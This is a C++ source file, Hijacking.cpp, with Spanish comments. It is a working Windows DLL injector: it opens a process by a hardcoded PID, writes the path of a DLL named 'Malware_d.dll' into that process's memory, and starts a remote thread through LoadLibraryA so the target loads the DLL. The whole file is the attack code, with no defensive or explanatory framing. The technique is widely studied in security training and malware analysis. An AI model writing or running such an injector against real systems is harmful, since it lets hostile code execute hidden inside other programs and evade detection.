// Hijacking.cpp : Defines the entry point for the console application.
//

#include <iostream>
#include <Windows.h>

using namespace std;

int main()
{

	// Libreria a cargar
	LPCSTR DllPath = "Malware_d.dll";

	// Cargar el proceso
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 10496);

	if (hProcess == NULL)
	{
		cout << "Error abriendo el proceso seleccionado: " << GetLastError() << endl;
		return 1;
	}

	// reservar memoria para el path en el proceso objetivo
	// El largo de la memoria reservada es el path + final de string ('\0')
	LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(DllPath) + 1, MEM_COMMIT, PAGE_READWRITE);

	if (pDllPath == NULL)
	{
		cout << "Error reservando memoria en el proceso seleccionado: " << GetLastError() << endl;
		return 1;
	}

	// Escribir el path a la direccion de memoria que acavamos de reservar en el proceso seleccionado
	WriteProcessMemory(hProcess, pDllPath, (LPVOID)DllPath, strlen(DllPath) + 1, 0);

	// Crea un thread remoto con el proceso, la dll...
	HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"), pDllPath, 0, 0);

	if (hLoadThread == NULL)
	{
		cout << "Error cargando el thread remoto: " << GetLastError() << endl;
		return 1;
	}

	// Esperar a que termine la creacion 
	WaitForSingleObject(hLoadThread, INFINITE);

	cin.get();

	// Liberar la memoria reservada
	VirtualFreeEx(hProcess, pDllPath, strlen(DllPath) + 1, MEM_RELEASE);

    return 0;
}

